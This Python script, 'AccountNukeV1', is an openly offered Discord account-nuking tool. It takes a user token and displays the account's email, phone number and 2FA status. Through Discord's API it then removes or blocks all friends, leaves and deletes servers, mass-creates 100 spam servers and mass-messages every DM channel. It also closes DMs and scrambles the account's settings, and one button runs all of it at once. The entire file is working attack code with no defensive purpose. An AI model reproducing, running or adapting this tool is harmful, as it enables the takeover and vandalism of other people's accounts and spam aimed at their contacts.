import os, requests, ctypes, random, string
import PySimpleGUI as sg
from colorama import Fore, init
from selenium import webdriver
from time import sleep
v="AccountNukeV1"
ctypes.windll.kernel32.SetConsoleTitleW(f"{v} | Console | xara")
init()
def title():
    print(Fore.LIGHTGREEN_EX + f"{v}")
    print(Fore.RED + "-------------")
title()
print(Fore.RED + f"Welcome, please enter a {Fore.RESET}token {Fore.RED}in the gui.\n{Fore.LIGHTGREEN_EX}credits:\n{Fore.RESET}xara\nhttps://github.com/Xara-01")
{Fore.RED}
sleep(.5)
# get token
sg.theme('Dark Brown 4')

layout = [[sg.Text('Enter token:')],      
    [sg.InputText(key='-IN-')],      
    [sg.Submit()]]

window = sg.Window('Enter Token', layout)    

event, values = window.read()   
sleep(.5)  
window.close()

Token = values['-IN-']
headers = {'Authorization': Token, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
if r.status_code == 200:
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    userName = r.json()['username'] + '#' + r.json()['discriminator']
    userID = r.json()['id']
    phone = r.json()['phone']
    email = r.json()['email']
    mfa = r.json()['mfa_enabled']
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Account information:")
    print(f'''{Fore.RED}User ID: {userID}
User Name: {userName}
2 Factor: {mfa}
Email: {email}
Phone number: {phone if phone else "No phone number"}''')
    layout = [[sg.Text('Open token in chrome(y/n):')],      
    [sg.InputText(key='-IN-')],      
    [sg.Submit()]]
else:
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Invalid token")
    print(f'''{Fore.RED}{Token}''')
    sleep(2)
    os._exit(0)
# buttons creds https://github.com/Xara-01)
def r_friends():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Removing all friends...")
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
        )
    print("finished")

def b_friends():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Blocking all friends...")
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
    print("finished")

def l_servers():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Leaving all servers...")
    try:
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        leave_all_servers_request = requests.get(
            "https://canary.discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for guild in leave_all_servers_request:
            requests.delete(
                f"https://canary.discord.com/api/v9/users/@me/guilds/{guild['id']}",
                headers=headers,
            )
    except:
        pass
    try:
        delete_personal_request = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for i in delete_personal_request:
            requests.post(
                f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
                headers=headers,
            )
    except:
        pass
    print("finished")

def s_servers():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    sleep(.5)
    layout = [[sg.Text('Server name:')],      
                [sg.InputText(key='-IN-')],     
                [sg.Submit()]]
    window = sg.Window('Server name | Gui', layout)
    event, values = window.read()
    sleep(.5)   
    window.close()
    server_name = values['-IN-']
    print("Mass creating servers...")
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for i in range(int(100)):
            string1=''.join(random.choices(string.ascii_letters, k=1))
            string2=''.join(random.choices(string.ascii_letters, k=1))
            payload = {"name": f"{string1} | {server_name} | {string2}"}
            spam_server_request = requests.post(
                "https://canary.discord.com/api/v9/guilds", headers=headers, json=payload
                )
    print("finished")

def c_dms():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Closing all dms...")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}",
            headers=headers,
        )
    print("finished")

def s_mass_dm():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    sleep(.5) 
    layout = [[sg.Text('Message:')],      
                [sg.InputText(key='-IN-')],      
                [sg.Submit()]]
    window = sg.Window('Message | Gui', layout)
    event, values = window.read()
    sleep(.5)     
    window.close()
    mass_dm_message = values['-IN-']
    print("Mass dming...")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": mass_dm_message}
        r = requests.post(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        sleep(.5)
    print("finished")


def m_servers_as_read():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Marking servers as read...")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mark_guild_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for channel in mark_guild_request:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{channel['id']}/ack", headers=headers
        )
    print("finished")


def settings_f():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Fucking up settings...")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    payload = {"theme": "light", "developer_mode": True, "afk_timeout": 60, "locale": "ko", "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True}
    requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    print("finished")
    
    
def everything():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    print("Enter message to dm everyone")
    layout = [[sg.Text('Message:')],      
                [sg.InputText(key='-IN-')],      
                [sg.Submit()]]
    window = sg.Window('Message | Gui', layout)
    event, values = window.read()
    sleep(.5)     
    window.close()
    mass_dm_message = values['-IN-']
    
    print("Enter Server name")
    layout = [[sg.Text('Server name:')],      
                [sg.InputText(key='-IN-')],     
                [sg.Submit()]]
    window = sg.Window('Server name | Gui', layout)
    event, values = window.read()
    sleep(.5)   
    window.close()
    server_name = values['-IN-']
    print("Mass dming...") # MASS DM
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": mass_dm_message}
        r = requests.post(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        sleep(.5)
    print("finished")
    print("Removing all friends...") # FRIEND R
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
        )
    print("finished")
    print("Closing all dms...") # DM CLOSE
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}",
            headers=headers,
        )
    print("finished")
    print("Leaving all servers...") # LEAVE SERVERS
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
    print("finished")
    print("Mass creating servers...") # CREATE SERVERS
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for i in range(int(100)):
            string1=''.join(random.choices(string.ascii_letters, k=1))
            string2=''.join(random.choices(string.ascii_letters, k=1))
            payload = {"name": f"{string1} | {server_name} | {string2}"}
            spam_server_request = requests.post(
                "https://canary.discord.com/api/v9/guilds", headers=headers, json=payload
                )
    print("finished")
    print("Fucking up settings...")
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    payload = {"theme": "light", "developer_mode": True, "afk_timeout": 60, "locale": "ko", "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True}
    requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    print("finished")
    
    
# gui
layout = [[sg.Text(f'{v} x xara#0001')],      
    [sg.Text(f'Logged into: {userName}')],
    [sg.Button('Remove all friends'), sg.Button('Block all friends')],
    [sg.Button('Leave all servers'), sg.Button('Mass create servers')],
    [sg.Button('Close all dms'), sg.Button('Mass dm'), sg.Button('Fuck settings')],
    [sg.Button('Mark servers as read'), sg.Button('Do everything')], 
    [sg.Exit()]]

window = sg.Window(f"{v}", layout)
# loop
while True:             
    event, values = window.Read()
    if event in (None, 'Exit'):
        break
    if event == 'Remove all friends':
        r_friends()
    if event == 'Leave all servers':
        l_servers()
    if event == 'Mass create servers':
        s_servers()
    if event == 'Close all dms':
        c_dms()
    if event == 'Mass dm':
        s_mass_dm()
    if event == 'Mark servers as read':
        m_servers_as_read()
    if event == 'Fuck settings':
        settings_f()
    if event == 'Do everything':
        everything()
        print(f"{Fore.YELLOW}everything finished!{Fore.RESET}")       
    elif event == 'Block all friends':
        b_friends()
window.Close()
